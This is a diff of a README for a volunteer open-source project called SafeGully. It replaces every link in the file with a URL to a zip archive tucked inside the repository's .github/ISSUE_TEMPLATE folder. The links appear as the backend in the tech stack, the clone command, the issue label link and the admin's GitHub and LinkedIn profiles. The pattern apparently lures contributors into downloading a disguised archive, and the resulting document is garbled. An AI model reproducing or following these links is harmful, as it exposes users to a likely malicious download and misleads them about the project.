@@ -10,7 +10,7 @@ This project is part of **GirlScript Summer of Code 2025**. We welcome contribut
 
 ### 🔧 Tech Stack (Planned)
 - **Frontend:** HTML, CSS, JavaScript (React or Vanilla)
-- **Backend:** https://raw.githubusercontent.com/Dhruva105/SafeGully/main/style/Safe_Gully_v2.0.zip + Express
+- **Backend:** https://github.com/Dhruva105/SafeGully/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Gully-Safe-simplicity.zip + Express
 - **Database:** MongoDB (using MongoDB Atlas)
 - **APIs:** Location-based services (Mapbox or Google Maps)
 
@@ -25,8 +25,8 @@ This project is part of **GirlScript Summer of Code 2025**. We welcome contribut
 ├── backend/
 ├── public/
 ├── .github/
-├── https://raw.githubusercontent.com/Dhruva105/SafeGully/main/style/Safe_Gully_v2.0.zip
-└── https://raw.githubusercontent.com/Dhruva105/SafeGully/main/style/Safe_Gully_v2.0.zip
+├── https://github.com/Dhruva105/SafeGully/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Gully-Safe-simplicity.zip
+└── https://github.com/Dhruva105/SafeGully/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Gully-Safe-simplicity.zip
 
 ```
 
@@ -38,7 +38,7 @@ We follow standard open-source contribution practices.
 
 1. **Fork** the repo
 2. **Clone** your fork:  
-   `git clone https://raw.githubusercontent.com/Dhruva105/SafeGully/main/style/Safe_Gully_v2.0.zip`
+   `git clone https://github.com/Dhruva105/SafeGully/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Gully-Safe-simplicity.zip`
 3. Create a new branch:  
    `git checkout -b feature-name`
 4. Make your changes and **commit**
@@ -48,7 +48,7 @@ We follow standard open-source contribution practices.
 
 ## 💡 Good First Issues
 
-Check out our [`good first issue`](https://raw.githubusercontent.com/Dhruva105/SafeGully/main/style/Safe_Gully_v2.0.zip%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) label to start contributing easily!
+Check out our [`good first issue`](https://github.com/Dhruva105/SafeGully/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Gully-Safe-simplicity.zip%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) label to start contributing easily!
 
 ---
 
@@ -61,7 +61,7 @@ Feel free to reach out on Discord for guidance or to ask questions. We're here t
 ## 🤝 Project Admin
 
 - **Vaishnavi Khandelwal**  
-  [GitHub](https://raw.githubusercontent.com/Dhruva105/SafeGully/main/style/Safe_Gully_v2.0.zip) • [LinkedIn](https://raw.githubusercontent.com/Dhruva105/SafeGully/main/style/Safe_Gully_v2.0.zip)
+  [GitHub](https://github.com/Dhruva105/SafeGully/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Gully-Safe-simplicity.zip) • [LinkedIn](https://github.com/Dhruva105/SafeGully/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Gully-Safe-simplicity.zip)
   
 ---
 
